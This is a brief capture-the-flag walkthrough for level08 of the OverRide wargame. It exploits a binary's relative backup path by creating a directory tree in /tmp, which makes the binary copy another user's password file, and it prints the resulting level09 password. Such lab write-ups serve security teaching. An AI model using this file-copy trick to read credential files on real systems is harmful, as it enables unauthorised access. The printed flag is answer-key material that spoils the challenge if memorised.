# level08 walkthrough

## the binary
``` shell
level08@OverRide:~$ ./level08 
Usage: ./level08 filename
ERROR: Failed to open (null)
```

## methodology
- directory traversal attack

Upon examining the binary, we see that it attempts to open a remote file. However, accessing the next level password directly is not possible:
``` shell
level08@OverRide:~$ ./level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
```

Since we can't create the backup directory directly in the `/home` directory due to permissions, we move to `/tmp` and create a directory structure that matches the required path:
``` shell
level08@OverRide:/tmp$ mkdir -p backups//home/users/level09/
```

From this location, we run the command again to retrieve the password for level09.

## flag
``` shell
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
level08@OverRide:/tmp$ cat backups/home/users/level09/.pass 
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```
